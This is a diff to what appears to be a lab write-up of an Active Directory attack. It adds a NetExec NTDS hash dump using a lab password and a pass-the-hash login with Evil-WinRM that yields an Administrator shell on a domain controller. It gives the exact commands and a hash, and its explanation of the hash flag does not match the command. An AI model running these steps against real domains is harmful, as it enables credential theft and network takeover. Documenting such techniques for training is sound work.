@@ -47,7 +47,7 @@ In the next stage, I used the credentials of the same user to proceed with the N
 - user name: `test`
 - password: `@shahin123#!`
 
-## Step -2 NTDS Dump — NetExec
+## Step - 2 NTDS Dump — NetExec
 
 ```bash
 nxc smb 192.168.5.134 -u test -p '@shahin123#!' --ntds
@@ -95,6 +95,43 @@ SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumped 12 NTDS hashes to
 SMB         192.168.5.134   445    REDTEAMBD-DC     [*] To extract only enabled accounts from the output file, run the following command: 
 SMB         192.168.5.134   445    REDTEAMBD-DC     [*] grep -iv disabled /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds | cut -d ':' -f1
 ```
+<p align="center">
+  <img src="/writeups/ntds dump/images/step2.png" width="600">
+</p>
+
+# Step - 3 Getting a Shell with Evil-WinRM
+
+After dumping the NTDS.dit and getting the Administrator hash, I used
+Evil-WinRM to log into the Domain Controller directly using the hash —
+no password needed.
+
+```bash
+evil-winrm -i 192.168.5.134 -u 'administrator' -H 'fc525c9683e8fe067095ba2ddc971889'
+```
+
+## Command Breakdown
+
+- `evil-winrm` - A tool used to remotely access Windows machines via the WinRM (Windows Remote Management) protocol.
+- `-i 192.168.5.134`- IP address of the target machine.
+- `-u administrator`- Username used for authentication.
+- `-H 'jlkahflahfklasklfashl'`- Last portion of administrator NTLM hash.
+
+This is a Pass the Hash attack. Instead of using the actual password, I used the NTLM hash I dumped earlier from NTDS.dit to log straight into the Domain Controller as Administrator — no cracking needed.
+Once the command runs successfully, I get a full interactive shell on the Domain Controller.
+
+**Output:**
+
+```text
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+
+
+
+
+
+
+
 
 
 
